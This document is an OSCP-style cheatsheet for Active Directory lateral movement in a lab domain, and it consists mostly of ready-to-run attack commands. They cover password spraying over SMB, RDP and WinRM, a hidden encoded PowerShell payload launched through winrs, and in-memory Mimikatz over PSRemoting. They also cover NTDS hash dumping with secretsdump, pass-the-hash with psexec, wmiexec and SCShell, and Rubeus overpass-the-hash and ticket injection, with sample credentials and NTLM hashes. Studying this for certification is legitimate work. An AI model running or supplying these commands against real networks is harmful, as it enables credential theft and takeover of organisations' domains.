# Active Directory Lateral Movement Cheatsheet (OSCP)

> Goal: Move between domain-joined systems using valid credentials, hashes, or Kerberos tickets  
> Focus: WinRM, WinRS, PSRemoting, Pass-the-Hash, Overpass-the-Hash

---

## 1. Environment Enumeration & Prep (Kali)

### Enumerate Hosts & Generate Hosts File
```bash
nxc smb ips.txt -u jen -p 'Nexus123!' -d corp.com --generate-hosts-file /tmp/hosts
```

Add to hosts:
```bash
cat /tmp/hosts | sudo tee -a /etc/hosts
```

Example:
```
192.168.X.70 DC1.corp.com corp.com DC1
192.168.X.72 WEB04.corp.com WEB04
192.168.X.73 FILES04.corp.com FILES04
192.168.X.74 CLIENT74.corp.com CLIENT74
192.168.X.75 CLIENT75.corp.com CLIENT75
192.168.X.76 CLIENT76.corp.com CLIENT76
```

Configure DNS:
```bash
cat /etc/resolv.conf
nameserver 192.168.X.70
```

Install Kerberos client:
```bash
sudo apt install -y krb5-user
```

---

## 2. Credential & Tool Staging

### Upload Invoke-Mimikatz
```text
https://github.com/g4uss47/Invoke-Mimikatz/blob/master/Invoke-Mimikatz.ps1
```

Upload to:
```
C:\Tools\Invoke-Mimikatz.ps1
```

---

## 3. RDP Enumeration

### Check RDP Access (Impacket)
```bash
for ip in $(cat ips.txt); do
  echo "Trying ${ip}..."
  impacket-rdp_check corp.com/stephanie:'LegmanTeamBenzoin!!'@${ip}
  echo
done
```

### NetExec RDP Check
```bash
nxc rdp ips.txt -u stephanie -p 'LegmanTeamBenzoin!!' -d corp.com
```

---

## 4. WinRM Enumeration

```bash
nxc winrm ips.txt -u jen -p 'Nexus123!' -d corp.com
```

---

## 5. WinRS (Windows Remote Shell)

**Description:**  
WinRS executes commands remotely over WinRM. Authentication uses Kerberos or NTLM. Commands execute in a high-integrity context.

### Encoded PowerShell Payload
Use CyberChef:
- UTF-16LE
- Base64

```bash
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBD..."
```

---

## 6. PowerShell Remoting (PSRemoting)

**Description:**  
Creates an interactive PowerShell session (runspace) on a remote system using WinRM.

### Create Credentials (Non-Interactive)
```powershell
$username = "jen"
$password = "Nexus123!"
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
```

### Create Session
```powershell
$files04 = New-PSSession -ComputerName files04.corp.com -Credential $credential
Enter-PSSession -Session $files04
```

### Run Commands in Parallel
```powershell
Invoke-Command -Scriptblock { hostname } -ComputerName (Get-Content .\ips.txt) -Credential $credential
```

---

## 7. In-Memory Mimikatz via PSRemoting

**Note:**  
WinRM sessions run as high-integrity. PowerView/BloodHound may not work, but Mimikatz does.

### Load Script
```powershell
. .\Invoke-Mimikatz.ps1
```

### Execute Remotely
```powershell
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $files04
```

---

## 8. Evil-WinRM (Kali)

```bash
evil-winrm -u 'jen' -p 'Nexus123!' -i 192.168.X.73
```

---

## 9. Pass-the-Hash (PTH)

**Description:**  
Authenticate using NTLM hashes instead of plaintext passwords.

### Dump Hashes from DC
```bash
nxc smb 192.168.X.70 -u jeffadmin -p 'BrouhahaTungPerorateBroom2023!' -M ntdsutil
```

```bash
impacket-secretsdump corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.X.70
```

```bash
impacket-lookupsid corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.X.70
```

---

### PsExec (Service Creation)
```bash
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.X.73
```

---

### WMIExec
```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.X.73
```

---

## 10. Stealthy Service Abuse – SCShell

**Description:**  
Modifies an existing stopped service to execute payloads without creating new services.

```bash
python3 scshell.py administrator@192.168.X.73 \
-hashes :2892D26CDF84D7A70E2EB3B9F05C425E \
-service-name defragsvc
```

Repo:
```text
https://github.com/Mr-Un1k0d3r/SCShell
```

---

## 11. Overpass-the-Hash (Over-PTH)

**Description:**  
Uses NTLM hashes to request Kerberos tickets, enabling Kerberos-based authentication.

### Request TGT
```powershell
.\Rubeus.exe asktgt /user:jen /password:'Nexus123!' /domain:corp.com /outfile:ticket.kirbi
```

```powershell
.\Rubeus.exe asktgt /user:jen /rc4:369DEF79D8372408BF6E93364CC93075 /domain:corp.com /outfile:ticket2.kirbi
```

### Get NTLM Hash
```powershell
.\Rubeus.exe hash /user:jen /password:'Nexus123!' /domain:corp.com
```

---

### Inject Ticket
```powershell
.\Rubeus.exe describe /ticket:ticket.kirbi
.\Rubeus.exe purge
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

---

### Validate Access
```powershell
$files04 = New-PSSession -ComputerName files04.corp.com
Enter-PSSession -Session $files04
```

---

## OSCP Lateral Movement Flow

1. Enumerate WinRM / RDP  
2. Use WinRS / PSRemoting  
3. Dump creds in memory  
4. PTH / Over-PTH  
5. Pivot & escalate
